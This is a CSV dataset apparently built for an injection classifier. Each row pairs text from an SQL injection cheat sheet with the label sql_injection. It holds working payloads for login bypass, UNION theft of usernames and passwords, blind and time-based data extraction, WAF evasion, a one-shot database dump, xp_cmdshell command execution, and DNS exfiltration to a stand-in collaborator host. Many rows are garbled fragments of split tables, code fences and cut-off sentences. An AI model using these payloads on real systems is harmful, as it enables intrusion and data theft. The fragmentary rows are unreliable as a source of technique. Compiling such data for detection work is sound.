payload,label
`+HERP,sql_injection
'||'DERP,sql_injection
'+'herp,sql_injection
' 'DERP,sql_injection
'%20'HERP,sql_injection
'%2B'HERP,sql_injection
```,sql_injection
* Logic Testing,sql_injection
```sql,sql_injection
page.asp?id=1 or 1=1 -- true,sql_injection
page.asp?id=1' or 1=1 -- true,sql_injection
"page.asp?id=1"" or 1=1 -- true",sql_injection
page.asp?id=1 and 1=2 -- false,sql_injection
"* **Timing Attacks**: Inputting SQL commands that cause deliberate delays (e.g., using `SLEEP` or `BENCHMARK` functions in MySQL) can help identify potential injection points. If the application takes an unusually long time to respond after such input, it might be vulnerable.",sql_injection
"Certain SQL keywords are specific to particular database management systems (DBMS). By using these keywords in SQL injection attempts and observing how the website responds, you can often determine the type of DBMS in use.",sql_injection
| DBMS                | SQL Payload                     |,sql_injection
| ------------------- | ------------------------------- |,sql_injection
"| MySQL               | `conv('a',16,2)=conv('a',16,2)` |",sql_injection
| MySQL               | `connection_id()=connection_id()` |,sql_injection
| MySQL               | `crc32('MySQL')=crc32('MySQL')` |,sql_injection
| MSSQL               | `BINARY_CHECKSUM(123)=BINARY_CHECKSUM(123)` |,sql_injection
| MSSQL               | `@@CONNECTIONS>0` |,sql_injection
| MSSQL               | `@@CONNECTIONS=@@CONNECTIONS` |,sql_injection
| MSSQL               | `@@CPU_BUSY=@@CPU_BUSY` |,sql_injection
| MSSQL               | `USER_ID(1)=USER_ID(1)` |,sql_injection
| ORACLE              | `ROWNUM=ROWNUM` |,sql_injection
| ORACLE              | `RAWTOHEX('AB')=RAWTOHEX('AB')` |,sql_injection
| ORACLE              | `LNNVL(0=123)` |,sql_injection
| POSTGRESQL          | `5::int=5` |,sql_injection
| POSTGRESQL          | `5::integer=5` |,sql_injection
| POSTGRESQL          | `pg_client_encoding()=pg_client_encoding()` |,sql_injection
| POSTGRESQL          | `get_current_ts_config()=get_current_ts_config()` |,sql_injection
| POSTGRESQL          | `quote_literal(42.5)=quote_literal(42.5)` |,sql_injection
| POSTGRESQL          | `current_database()=current_database()` |,sql_injection
| SQLITE              | `sqlite_version()=sqlite_version()` |,sql_injection
| SQLITE              | `last_insert_rowid()>1` |,sql_injection
| SQLITE              | `last_insert_rowid()=last_insert_rowid()` |,sql_injection
| MSACCESS            | `val(cvar(1))=1` |,sql_injection
"| MSACCESS            | `IIF(ATN(2)>0,1,0) BETWEEN 2 AND 0` |",sql_injection
"Different DBMSs return distinct error messages when they encounter issues. By triggering errors and examining the specific messages sent back by the database, you can often identify the type of DBMS the website is using.",sql_injection
| DBMS                | Example Error Message                                                                    | Example Payload |,sql_injection
| ------------------- | -----------------------------------------------------------------------------------------|-----------------|,sql_injection
| MySQL               | `You have an error in your SQL syntax; ... near '' at line 1`                            | `'`             |,sql_injection
"| PostgreSQL          | `ERROR: unterminated quoted string at or near ""'""`                                       | `'`             |",sql_injection
"| PostgreSQL          | `ERROR: syntax error at or near ""1""`                                                     | `1'`            |",sql_injection
| Microsoft SQL Server| `Unclosed quotation mark after the character string ''.`                                 | `'`             |,sql_injection
| Microsoft SQL Server| `Incorrect syntax near ''.`                                                              | `'`             |,sql_injection
| Microsoft SQL Server| `The conversion of the varchar value to data type int resulted in an out-of-range value.`| `1'`            |,sql_injection
| Oracle              | `ORA-00933: SQL command not properly ended`                                              | `'`             |,sql_injection
| Oracle              | `ORA-01756: quoted string not properly terminated`                                       | `'`             |,sql_injection
| Oracle              | `ORA-00923: FROM keyword not found where expected`                                       | `1'`            |,sql_injection
"In a standard authentication mechanism, users provide a username and password. The application typically checks these credentials against a database. For example, a SQL query might look something like this:",sql_injection
"An attacker can attempt to inject malicious SQL code into the username or password fields. For instance, if the attacker types the following in the username field:",sql_injection
"And leaves the password field empty, the resulting SQL query executed might look like this:",sql_injection
"Here, `'1'='1'` is always true, which means the query could return a valid user, effectively bypassing the authentication check.",sql_injection
":warning: In this case, the database will return an array of results because it will match every users in the table. This will produce an error in the server side since it was expecting only one result. By adding a `LIMIT` clause, you can restrict the number of rows returned by the query. By submitting the following payload in the username field, you will log in as the first user in the database. Additionally, you can inject a payload in the password field while using the correct username to target a specific user.",sql_injection
":warning: Avoid using this payload indiscriminately, as it always returns true. It could interact with endpoints that may inadvertently delete sessions, files, configurations, or database data.",sql_injection
* [PayloadsAllTheThings/SQL Injection/Intruder/Auth_Bypass.txt](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/Intruder/Auth_Bypass.txt),sql_injection
"In PHP, if the optional `binary` parameter is set to true, then the `md5` digest is instead returned in raw binary format with a length of 16. Let's take this PHP code where the authentication is checking the MD5 hash of the password submitted by the user.",sql_injection
"An attacker can craft a payload where the result of the `md5($password,true)` function will contain a quote and escape the SQL context, for example with `' or 'SOMETHING`.",sql_injection
| Hash | Input    | Output (Raw)            |  Payload  |,sql_injection
| ---- | -------- | ----------------------- | --------- |,sql_injection
"| md5  | ffifdyop | `'or'6�]��!r,��b`       | `'or'`    |",sql_injection
| md5  | 129581926211651571912466741651878684928 | `ÚT0Do#ßÁ'or'8` | `'or'` |,sql_injection
| sha1 | 3fDf     | `Q�u'='�@�[�t�- o��_-!` | `'='`     |,sql_injection
| sha1 | 178374   | `ÜÛ¾}_ia!8Wm'/*´Õ`      | `'/*`     |,sql_injection
| sha1 | 17       | `Ùp2ûjww%6\`            | `\`       |,sql_injection
This behavior can be abused to bypass the authentication by escaping the context.,sql_injection
"By 2025, applications almost never store plaintext passwords. Authentication systems instead use a representation of the password (a hash derived by a key-derivation function, often with a salt). That evolution changes the mechanics of some classic SQL injection (SQLi) bypasses: an attacker who injects rows via `UNION` must now supply values that match the stored representation the application expects, not the user’s raw password.",sql_injection
Many naïve authentication flows perform these high-level steps:,sql_injection
"* Query the database for the user record (e.g., `SELECT username, password_hash FROM users WHERE username = ?`).",sql_injection
* Receive the stored `password_hash` from the DB.,sql_injection
* Locally compute `hash(input_password)` using whatever algorithm is configured.,sql_injection
* Compare `stored_password_hash == hash(input_password)`.,sql_injection
"If an attacker can inject an extra row into the result set (for example using `UNION`), they can make the application receive an attacker-controlled stored_password_hash. If that injected hash equals `hash(attacker_supplied_password)` as computed by the app, the comparison succeeds and the attacker is authenticated as the injected username.",sql_injection
* `AND 1=0`: to force the request to be false.,sql_injection
"* `SELECT 'admin', '161ebd7d45089b3446ee4e0d86dbcf92'`: select as many columns as necessary, here 161ebd7d45089b3446ee4e0d86dbcf92 corresponds to `MD5(""P@ssw0rd"")`.",sql_injection
"If the application computes `MD5(""P@ssw0rd"")` and that equals `161ebd7d45089b3446ee4e0d86dbcf92`, then supplying `""P@ssw0rd""` as the login password will pass the check.",sql_injection
"This method fails if the app stores `salt` and `KDF(salt, password)`. A single injected static hash cannot match a per-user salted result unless the attacker also knows or controls the salt and KDF parameters.",sql_injection
"In a standard SQL query, data is retrieved from one table. The `UNION` operator allows multiple `SELECT` statements to be combined. If an application is vulnerable to SQL injection, an attacker can inject a crafted SQL query that appends a `UNION` statement to the original query.",sql_injection
Let's assume a vulnerable web application retrieves product details based on a product ID from a database:,sql_injection
An attacker could modify the `input_id` to include the data from another table like `users`.,sql_injection
"After submitting our payload, the query become the following SQL:",sql_injection
:warning: The 2 SELECT clauses must have the same number of columns.,sql_injection
"Error-Based SQL Injection is a technique that relies on the error messages returned from the database to gather information about the database structure. By manipulating the input parameters of an SQL query, an attacker can make the database generate error messages. These errors can reveal critical details about the database, such as table names, column names, and data types, which can be used to craft further attacks.",sql_injection
"For example, on a PostgreSQL, injecting this payload in a SQL query would result in an error since the LIMIT clause is expecting a numeric value.",sql_injection
The error will leak the output of the `version()`.,sql_injection
Blind SQL Injection is a type of SQL Injection attack that asks the database true or false questions and determines the answer based on the application's response.,sql_injection
"Attacks rely on sending an SQL query to the database, making the application return a different result depending on whether the query returns TRUE or FALSE. The attacker can infer information based on differences in the behavior of the application.",sql_injection
"Size of the page, HTTP response code, or missing parts of the page are strong indicators to detect whether the Boolean-based Blind SQL injection was successful.",sql_injection
Here is a naive example to recover the content of the `@@hostname` variable.,sql_injection
**Identify Injection Point and Confirm Vulnerability** : Inject a payload that evaluates to true/false to confirm SQL injection vulnerability. For example:,sql_injection
**Extract Hostname Length**: Guess the length of the hostname by incrementing until the response indicates a match. For example:,sql_injection
**Extract Hostname Characters** : Extract each character of the hostname using substring and ASCII comparison:,sql_injection
Then repeat the method to discover every characters of the `@@hostname`. Obviously this example is not the fastest way to obtain them. Here are a few pointers to speed it up:,sql_injection
"* Extract characters using dichotomy: it reduces the number of requests from linear to logarithmic time, making data extraction much more efficient.",sql_injection
"Attacks rely on sending an SQL query to the database, making the application return a different result depending on whether the query returned successfully or triggered an error. In this case, we only infer the success from the server's answer, but the data is not extracted from output of the error.",sql_injection
**Example**: Using `json()` function in SQLite to trigger an error as an oracle to know when the injection is true or false.,sql_injection
Time-based SQL Injection is a type of blind SQL Injection attack that relies on database delays to infer whether certain queries return true or false. It is used when an application does not display any direct feedback from the database queries but allows execution of time-delayed SQL commands. The attacker can analyze the time it takes for the database to respond to indirectly gather information from the database.,sql_injection
* Default `SLEEP` function for the database,sql_injection
"* Heavy queries that take a lot of time to complete, usually crypto functions.",sql_injection
Let's see a basic example to recover the version of the database using a time based sql injection.,sql_injection
"If the server's response is taking a few seconds before getting received, then the version is starting is by '5'.",sql_injection
"Out-of-Band SQL Injection (OOB SQLi) occurs when an attacker uses alternative communication channels to exfiltrate data from a database. Unlike traditional SQL injection techniques that rely on immediate responses within the HTTP response, OOB SQL injection depends on the database server's ability to make network connections to an attacker-controlled server. This method is particularly useful when the injected SQL command's results cannot be seen directly or the server's responses are not stable or reliable.",sql_injection
"Different databases offer various methods for creating out-of-band connections, the most common technique is the DNS exfiltration:",sql_injection
* MySQL,sql_injection
LOAD_FILE('\\\\BURP-COLLABORATOR-SUBDOMAIN\\a'),sql_injection
SELECT ... INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a',sql_injection
* MSSQL,sql_injection
SELECT UTL_INADDR.get_host_address('BURP-COLLABORATOR-SUBDOMAIN'),sql_injection
exec master..xp_dirtree '//BURP-COLLABORATOR-SUBDOMAIN/a',sql_injection
"Stacked Queries SQL Injection is a technique where multiple SQL statements are executed in a single query, separated by a delimiter such as a semicolon (`;`). This allows an attacker to execute additional malicious SQL commands following a legitimate query. Not all databases or application configurations support stacked queries.",sql_injection
"A polygot SQL injection payload is a specially crafted SQL injection attack string that can successfully execute in multiple contexts or environments without modification. This means that the payload can bypass different types of validation, parsing, or execution logic in a web application or database by being valid SQL in various scenarios.",sql_injection
> Routed SQL injection is a situation where the injectable query is not the one which gives output but the output of injectable query goes to the query which gives output. - Zenodermus Javanicus,sql_injection
"In short, the result of the first SQL query is used to build the second SQL query. The usual format is `' union select 0xHEXVALUE --` where the HEX is the SQL injection for the second query.",sql_injection
**Example 1**:,sql_injection
"`0x2720756e696f6e2073656c65637420312c3223` is the hex encoded of `' union select 1,2#`",sql_injection
**Example 2**:,sql_injection
"`0x2d312720756e696f6e2073656c656374206c6f67696e2c70617373776f72642066726f6d2075736572732d2d2061` is the hex encoded of `-1' union select login,password from users-- a`.",sql_injection
" APOSTROPHE (')

* **Tautology-Based SQL Injection**: By inputting tautological (always true) conditions, you can test for vulnerabilities. For instance, entering ",sql_injection
"sql
      page.asp?id=1 or 1=1 -- true
      page.asp?id=1' or 1=1 -- true
      page.asp?id=1"" or 1=1 -- true
      page.asp?id=1 and 1=2 -- false
      ",sql_injection
" functions in MySQL) can help identify potential injection points. If the application takes an unusually long time to respond after such input, it might be vulnerable.

## DBMS Identification

### DBMS Identification Keyword Based

Certain SQL keywords are specific to particular database management systems (DBMS). By using these keywords in SQL injection attempts and observing how the website responds, you can often determine the type of DBMS in use.

| DBMS                | SQL Payload                     |
| ------------------- | ------------------------------- |
| MySQL               | ",sql_injection
" |
| MySQL               | ",sql_injection
" |
| MSSQL               | ",sql_injection
" |
| ORACLE              | ",sql_injection
" |
| POSTGRESQL          | ",sql_injection
" |
| SQLITE              | ",sql_injection
" |
| MSACCESS            | ",sql_injection
" |

### DBMS Identification Error Based

Different DBMSs return distinct error messages when they encounter issues. By triggering errors and examining the specific messages sent back by the database, you can often identify the type of DBMS the website is using.

| DBMS                | Example Error Message                                                                    | Example Payload |
| ------------------- | -----------------------------------------------------------------------------------------|-----------------|
| MySQL               | ",sql_injection
                            | ,sql_injection
"             |
| PostgreSQL          | ",sql_injection
                                       | ,sql_injection
                                                     | ,sql_injection
"            |
| Microsoft SQL Server| ",sql_injection
                                 | ,sql_injection
"             |
| Microsoft SQL Server| ",sql_injection
                                                              | ,sql_injection
"            |
| Oracle              | ",sql_injection
                                              | ,sql_injection
"             |
| Oracle              | ",sql_injection
"            |

## Authentication Bypass

In a standard authentication mechanism, users provide a username and password. The application typically checks these credentials against a database. For example, a SQL query might look something like this:

",sql_injection
"SQL
SELECT * FROM users WHERE username = 'user' AND password = 'pass';
",sql_injection
"sql
' OR '1'='1
",sql_injection
"SQL
SELECT * FROM users WHERE username = '' OR '1'='1' AND password = '';
",sql_injection
"sql
' or 1=1 limit 1 --
",sql_injection
" digest is instead returned in raw binary format with a length of 16. Let's take this PHP code where the authentication is checking the MD5 hash of the password submitted by the user.

",sql_injection
"php
sql = ""SELECT * FROM admin WHERE pass = '"".md5($password,true).""'"";
",sql_injection
".

| Hash | Input    | Output (Raw)            |  Payload  |
| ---- | -------- | ----------------------- | --------- |
| md5  | ffifdyop | ",sql_injection
       | ,sql_injection
"    |
| md5  | 129581926211651571912466741651878684928 | ",sql_injection
" |
| sha1 | 3fDf     | ",sql_injection
"     |
| sha1 | 178374   | ",sql_injection
      | ,sql_injection
"     |
| sha1 | 17       | ",sql_injection
            | ,sql_injection
"       |

This behavior can be abused to bypass the authentication by escaping the context.

",sql_injection
"php
sql1 = ""SELECT * FROM admin WHERE pass = '"".md5(""ffifdyop"", true).""'"";
sql1 = ""SELECT * FROM admin WHERE pass = ''or'6�]��!r,��b'"";
",sql_injection
"sql
admin' AND 1=0 UNION ALL SELECT 'admin', '161ebd7d45089b3446ee4e0d86dbcf92'--
",sql_injection
" statement to the original query.

Let's assume a vulnerable web application retrieves product details based on a product ID from a database:

",sql_injection
"sql
SELECT product_name, product_price FROM products WHERE product_id = 'input_id';
",sql_injection
"SQL
1' UNION SELECT username, password FROM users --
",sql_injection
"SQL
SELECT product_name, product_price FROM products WHERE product_id = '1' UNION SELECT username, password FROM users --';
",sql_injection
"ps1
ERROR: invalid input syntax for type numeric: ""PostgreSQL 9.5.25 on x86_64-pc-linux-gnu""
",sql_injection
"

## Blind Injection

Blind SQL Injection is a type of SQL Injection attack that asks the database true or false questions and determines the answer based on the application's response.

### Boolean Based Injection

Attacks rely on sending an SQL query to the database, making the application return a different result depending on whether the query returns TRUE or FALSE. The attacker can infer information based on differences in the behavior of the application.

Size of the page, HTTP response code, or missing parts of the page are strong indicators to detect whether the Boolean-based Blind SQL injection was successful.

Here is a naive example to recover the content of the ",sql_injection
"ps1
http://example.com/item?id=1 AND 1=1 -- (Expected: Normal response)
http://example.com/item?id=1 AND 1=2 -- (Expected: Different response or error)
",sql_injection
"ps1
http://example.com/item?id=1 AND LENGTH(@@hostname)=1 -- (Expected: No change)
http://example.com/item?id=1 AND LENGTH(@@hostname)=2 -- (Expected: No change)
http://example.com/item?id=1 AND LENGTH(@@hostname)=N -- (Expected: Change in response)
",sql_injection
"ps1
http://example.com/item?id=1 AND ASCII(SUBSTRING(@@hostname, 1, 1)) > 64 -- 
http://example.com/item?id=1 AND ASCII(SUBSTRING(@@hostname, 1, 1)) = 104 -- 
",sql_injection
". Obviously this example is not the fastest way to obtain them. Here are a few pointers to speed it up:

* Extract characters using dichotomy: it reduces the number of requests from linear to logarithmic time, making data extraction much more efficient.

### Blind Error Based Injection

Attacks rely on sending an SQL query to the database, making the application return a different result depending on whether the query returned successfully or triggered an error. In this case, we only infer the success from the server's answer, but the data is not extracted from output of the error.

**Example**: Using ",sql_injection
"sql
' AND CASE WHEN 1=1 THEN 1 ELSE json('') END AND 'A'='A -- OK
' AND CASE WHEN 1=2 THEN 1 ELSE json('') END AND 'A'='A -- malformed JSON
",sql_injection
"sql
' AND SLEEP(5)/*
' AND '1'='1' AND SLEEP(5)
' ; WAITFOR DELAY '00:00:05' --
",sql_injection
"

Let's see a basic example to recover the version of the database using a time based sql injection.

",sql_injection
"sql
http://example.com/item?id=1 AND IF(SUBSTRING(VERSION(), 1, 1) = '5', BENCHMARK(1000000, MD5(1)), 0) --
",sql_injection
"

If the server's response is taking a few seconds before getting received, then the version is starting is by '5'.

### Out of Band (OAST)

Out-of-Band SQL Injection (OOB SQLi) occurs when an attacker uses alternative communication channels to exfiltrate data from a database. Unlike traditional SQL injection techniques that rely on immediate responses within the HTTP response, OOB SQL injection depends on the database server's ability to make network connections to an attacker-controlled server. This method is particularly useful when the injected SQL command's results cannot be seen directly or the server's responses are not stable or reliable.

Different databases offer various methods for creating out-of-band connections, the most common technique is the DNS exfiltration:

* MySQL

  ",sql_injection
"sql
  LOAD_FILE('\\\\BURP-COLLABORATOR-SUBDOMAIN\\a')
  SELECT ... INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a'
  ",sql_injection
"sql
  SELECT UTL_INADDR.get_host_address('BURP-COLLABORATOR-SUBDOMAIN')
  exec master..xp_dirtree '//BURP-COLLABORATOR-SUBDOMAIN/a'
  ",sql_injection
"sql
1; EXEC xp_cmdshell('whoami') --
",sql_injection
"sql
SLEEP(1) /*' or SLEEP(1) or '"" or SLEEP(1) or ""*/
",sql_injection
"

## Routed Injection

> Routed SQL injection is a situation where the injectable query is not the one which gives output but the output of injectable query goes to the query which gives output. - Zenodermus Javanicus

In short, the result of the first SQL query is used to build the second SQL query. The usual format is ",sql_injection
"sql
' union select 0x2720756e696f6e2073656c65637420312c3223#
",sql_injection
"sql
-1' union select 0x2d312720756e696f6e2073656c656374206c6f67696e2c70617373776f72642066726f6d2075736572732d2d2061 -- a
",sql_injection
"

## Second Order SQL Injection

Second Order SQL Injection is a subtype of SQL injection where the malicious SQL payload is primarily stored in the application's database and later executed by a different functionality of the same application.
Unlike first-order SQLi, the injection doesn’t happen right away. It is **triggered in a separate step**, often in a different part of the application.

1. User submits input that is stored (e.g., during registration or profile update).

   ",sql_injection
"text
   Username: attacker'--
   Email: attacker@example.com
   ",sql_injection
"

2. That input is saved **without validation** but doesn't trigger a SQL injection.

   ",sql_injection
"sql
   INSERT INTO users (username, email) VALUES ('attacker\'--', 'attacker@example.com');
   ",sql_injection
"python
   query = ""SELECT * FROM logs WHERE username = '"" + user_from_db + ""'""
   ",sql_injection
"php
    $pdo = new PDO(APP_DB_HOST, APP_DB_USER, APP_DB_PASS);
    $col = '",sql_injection
"', $_GET['col']) . '",sql_injection
"). The attacker only needs to smuggle a """,sql_injection
""" or a """,sql_injection
""".

* Detect the SQLi using ",sql_injection
"ps1
    # 1st Payload: ?#\0
    # 2nd Payload: anything
    You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '",sql_injection
"SQL
    -- Before $pdo->prepare
    SELECT ",sql_injection
" FROM animals WHERE name = ?

    -- After $pdo->prepare
    SELECT ",sql_injection
 from information_schema.tables)y;#'#\0,sql_injection
"

## Generic WAF Bypass

---

### No Space Allowed

Some web applications attempt to secure their SQL queries by blocking or stripping space characters to prevent simple SQL injection attacks. However, attackers can bypass these filters by using alternative whitespace characters, comments, or creative use of parentheses.

#### Alternative Whitespace Characters

Most databases interpret certain ASCII control characters and encoded spaces (such as tabs, newlines, etc.) as whitespace in SQL statements. By encoding these characters, attackers can often evade space-based filters.

| Example Payload               | Description                      |
|-------------------------------|----------------------------------|
| ",sql_injection
")              |
| ",sql_injection
")        |
| ",sql_injection
" is vertical tab            |
| ",sql_injection
" is form feed               |
| ",sql_injection
")  |
| ",sql_injection
" is non-breaking space      |

**ASCII Whitespace Support by Database**:

| DBMS         | Supported Whitespace Characters (Hex)            |
|--------------|--------------------------------------------------|
| SQLite3      | 0A, 0D, 0C, 09, 20                               |
| MySQL 5      | 09, 0A, 0B, 0C, 0D, A0, 20                       |
| MySQL 3      | 01–1F, 20, 7F, 80, 81, 88, 8D, 8F, 90, 98, 9D, A0|
| PostgreSQL   | 0A, 0D, 0C, 09, 20                               |
| Oracle 11g   | 00, 0A, 0D, 0C, 09, 20                           |
| MSSQL        | 01–1F, 20                                        |

#### Bypassing with Comments and Parentheses

SQL allows comments and grouping, which can break up keywords and queries, thus defeating space filters:

| Bypass                                    | Technique            |
| ----------------------------------------- | -------------------- |
| ",sql_injection
"        | Comment              |
| ",sql_injection
" | Conditional comment  |
| ",sql_injection
"                     | Parenthesis          |

### No Comma Allowed

Bypass using ",sql_injection
".

| Forbidden           | Bypass |
| ------------------- | ------ |
| ",sql_injection
         | ,sql_injection
    | ,sql_injection
" |

### No Equal Allowed

Bypass using LIKE/NOT IN/IN/BETWEEN

| Bypass    | SQL Example |
| --------- | ------------------------------------------ |
| ",sql_injection
"          |
| ",sql_injection
"      |
| ",sql_injection
" |

### Case Modification

Bypass using uppercase/lowercase.

| Bypass    | Technique  |
| --------- | ---------- |
| ",sql_injection
"     | Uppercase  |
| ",sql_injection
"     | Lowercase  |
| ",sql_injection
"     | Mixed case |

Bypass using keywords case insensitive or an equivalent operator.

| Forbidden | Bypass                      |
| --------- | --------------------------- |
| ",sql_injection
     | ,sql_injection
"                        |
| ",sql_injection
"                      |
| ",sql_injection
"       |
| ",sql_injection
* **Numeric**: Query like `SELECT * FROM Table WHERE id = FUZZ;`,sql_injection
```ps1,sql_injection
AND 1     True,sql_injection
AND 0     False,sql_injection
AND true True,sql_injection
AND false False,sql_injection
1-false     Returns 1 if vulnerable,sql_injection
1-true     Returns 0 if vulnerable,sql_injection
1*56     Returns 56 if vulnerable,sql_injection
1*56     Returns 1 if not vulnerable,sql_injection
* **Login**: Query like `SELECT * FROM Users WHERE username = 'FUZZ1' AND password = 'FUZZ2';`,sql_injection
' OR '1,sql_injection
' OR 1 -- -,sql_injection
""" OR """" = """,sql_injection
""" OR 1 = 1 -- -",sql_injection
'=',sql_injection
'LIKE',sql_injection
'=0--+,sql_injection
"To successfully perform a union-based SQL injection, an attacker needs to know the number of columns in the original query.",sql_injection
Systematically increase the number of columns in the `UNION SELECT` statement until the payload executes without errors or produces a visible change. Each iteration checks the compatibility of the column count.,sql_injection
"Keep incrementing the number until you get a `False` response. Even though `GROUP BY` and `ORDER BY` have different functionality in SQL, they both can be used in the exact same fashion to determine the number of columns in the query.",sql_injection
| ORDER BY        | GROUP BY        | Result |,sql_injection
| --------------- | --------------- | ------ |,sql_injection
| `ORDER BY 1--+` | `GROUP BY 1--+` | True   |,sql_injection
| `ORDER BY 2--+` | `GROUP BY 2--+` | True   |,sql_injection
| `ORDER BY 3--+` | `GROUP BY 3--+` | True   |,sql_injection
| `ORDER BY 4--+` | `GROUP BY 4--+` | False  |,sql_injection
"Since the result is false for `ORDER BY 4`, it means the SQL query is only having 3 columns.",sql_injection
"In the `UNION` based SQL injection, you can `SELECT` arbitrary data to display on the page: `-1' UNION SELECT 1,2,3--+`.",sql_injection
"Similar to the previous method, we can check the number of columns with one request if error showing is enabled.",sql_injection
This method is effective when error reporting is enabled. It can help determine the number of columns in cases where the injection point occurs after a LIMIT clause.,sql_injection
| Payload                      | Error           |,sql_injection
| ---------------------------- | --------------- |,sql_injection
"| `1' LIMIT 1,1 INTO @--+`     | `The used SELECT statements have a different number of columns` |",sql_injection
"| `1' LIMIT 1,1 INTO @,@--+`  | `The used SELECT statements have a different number of columns` |",sql_injection
"| `1' LIMIT 1,1 INTO @,@,@--+` | `No error means query uses 3 columns` |",sql_injection
"Since the result doesn't show any error it means the query uses 3 columns: `-1' UNION SELECT 1,2,3--+`.",sql_injection
This query retrieves the names of all schemas (databases) on the server.,sql_injection
This query retrieves the names of all tables within a specified schema (the schema name is represented by PLACEHOLDER).,sql_injection
This query retrieves the names of all columns in a specified table.,sql_injection
This query aims to retrieve data from a specific table.,sql_injection
Method for `MySQL >= 4.1`.,sql_injection
| Payload | Output |,sql_injection
| --- | --- |,sql_injection
| `(1)and(SELECT * from db.users)=(1)` | Operand should contain **4** column(s) |,sql_injection
"| `1 and (1,2,3,4) = (SELECT * from db.users UNION SELECT 1,2,3,4 LIMIT 1)` | Column '**id**' cannot be null |",sql_injection
Method for `MySQL 5`,sql_injection
| `UNION SELECT * FROM (SELECT * FROM users JOIN users b)a` | Duplicate column name '**id**' |,sql_injection
| `UNION SELECT * FROM (SELECT * FROM users JOIN users b USING(id))a` | Duplicate column name '**name**' |,sql_injection
"| `UNION SELECT * FROM (SELECT * FROM users JOIN users b USING(id,name))a` | Data |",sql_injection
Extracting data from the 4th column without knowing its name.,sql_injection
"Injection example inside the query `select author_id,title from posts where author_id=[INJECT_HERE]`",sql_injection
| Name         | Payload         |,sql_injection
| ------------ | --------------- |,sql_injection
"| GTID_SUBSET  | `AND GTID_SUBSET(CONCAT('~',(SELECT version()),'~'),1337) -- -` |",sql_injection
"| JSON_KEYS    | `AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT('~',(SELECT version()),'~')) USING utf8))) -- -` |",sql_injection
"| EXTRACTVALUE | `AND EXTRACTVALUE(1337,CONCAT('.','~',(SELECT version()),'~')) -- -` |",sql_injection
"| UPDATEXML    | `AND UPDATEXML(1337,CONCAT('.','~',(SELECT version()),'~'),31337) -- -` |",sql_injection
"| EXP          | `AND EXP(~(SELECT * FROM (SELECT CONCAT('~',(SELECT version()),'~','x'))x)) -- -` |",sql_injection
"| OR           | `OR 1 GROUP BY CONCAT('~',(SELECT version()),'~',FLOOR(RAND(0)*2)) HAVING MIN(0) -- -` |",sql_injection
"| NAME_CONST   | `AND (SELECT * FROM (SELECT NAME_CONST(version(),1),NAME_CONST(version(),1)) as x)--` |",sql_injection
| UUID_TO_BIN  | `AND UUID_TO_BIN(version())='1` |,sql_injection
Works with `MySQL >= 4.1`,sql_injection
Shorter to read:,sql_injection
Works with `MySQL >= 5.1`,sql_injection
Works with `MySQL >= 5.0`,sql_injection
| Function | Example | Description |,sql_injection
| --- | --- | --- |,sql_injection
"| `SUBSTR` | `SUBSTR(version(),1,1)=5` | Extracts a substring from a string (starting at any position) |",sql_injection
"| `SUBSTRING` | `SUBSTRING(version(),1,1)=5` | Extracts a substring from a string (starting at any position) |",sql_injection
"| `RIGHT` | `RIGHT(left(version(),1),1)=5` | Extracts a number of characters from a string (starting from right) |",sql_injection
"| `MID` | `MID(version(),1,1)=4` | Extracts a substring from a string (starting at any position) |",sql_injection
"| `LEFT` | `LEFT(version(),1)=4` | Extracts a number of characters from a string (starting from left) |",sql_injection
Examples of Blind SQL injection using `SUBSTRING` or another equivalent function:,sql_injection
* TRUE: `if @@version starts with a 5`:,sql_injection
"2100935' OR IF(MID(@@version,1,1)='5',sleep(1),1)='2",sql_injection
Response:,sql_injection
HTTP/1.1 500 Internal Server Error,sql_injection
* FALSE: `if @@version starts with a 4`:,sql_injection
"2100935' OR IF(MID(@@version,1,1)='4',sleep(1),1)='2",sql_injection
HTTP/1.1 200 OK,sql_injection
"In MySQL, the `LIKE` operator can be used to perform pattern matching in queries. The operator allows the use of wildcard characters to match unknown or partial string values. This is especially useful in a blind SQL injection context when an attacker does not know the length or specific content of the data stored in the database.",sql_injection
Wildcard Characters in LIKE:,sql_injection
"* **Percentage Sign** (`%`): This wildcard represents zero, one, or multiple characters. It can be used to match any sequence of characters.",sql_injection
* **Underscore** (`_`): This wildcard represents a single character. It's used for more precise matching when you know the structure of the data but not the specific character at a particular position.,sql_injection
"Blind SQL injection can also be performed using the MySQL `REGEXP` operator, which is used for matching a string against a regular expression. This technique is particularly useful when attackers want to perform more complex pattern matching than what the `LIKE` operator can offer.",sql_injection
| Payload | Description |,sql_injection
"| `' OR (SELECT username FROM users WHERE username REGEXP '^.{8,}$') --` | Checking length |",sql_injection
| `' OR (SELECT username FROM users WHERE username REGEXP '[0-9]') --`   | Checking for the presence of digits |,sql_injection
"| `' OR (SELECT username FROM users WHERE username REGEXP '^a[a-z]') --` | Checking for data starting by ""a"" |",sql_injection
The following SQL codes will delay the output from MySQL.,sql_injection
* MySQL 4/5 : [`BENCHMARK()`](https://dev.mysql.com/doc/refman/8.4/en/select-benchmarking.html),sql_injection
"+BENCHMARK(40000000,SHA1(1337))+",sql_injection
"'+BENCHMARK(3200,SHA1(1))+'",sql_injection
"AND [RANDNUM]=BENCHMARK([SLEEPTIME]000000,MD5('[RANDSTR]'))",sql_injection
* MySQL 5: [`SLEEP()`](https://dev.mysql.com/doc/refman/8.4/en/miscellaneous-functions.html#function_sleep),sql_injection
RLIKE SLEEP([SLEEPTIME]),sql_injection
"OR ELT([RANDNUM]=[RANDNUM],SLEEP([SLEEPTIME]))",sql_injection
"XOR(IF(NOW()=SYSDATE(),SLEEP(5),0))XOR",sql_injection
AND SLEEP(10)=0,sql_injection
"AND (SELECT 1337 FROM (SELECT(SLEEP(10-(IF((1=1),0,10))))) RANDSTR)",sql_injection
Extracting the length of the data.,sql_injection
Extracting the first character.,sql_injection
Extracting the second character.,sql_injection
Extracting the third character.,sql_injection
Extracting column_name.,sql_injection
"DIOS (Dump In One Shot) SQL Injection is an advanced technique that allows an attacker to extract entire database contents in a single, well-crafted SQL injection payload. This method leverages the ability to concatenate multiple pieces of data into a single result set, which is then returned in one response from the database.",sql_injection
* SecurityIdiots,sql_injection
"make_set(6,@:=0x0a,(select(1)from(information_schema.columns)where@:=make_set(511,@,0x3c6c693e,table_name,column_name)),@)",sql_injection
* Profexer,sql_injection
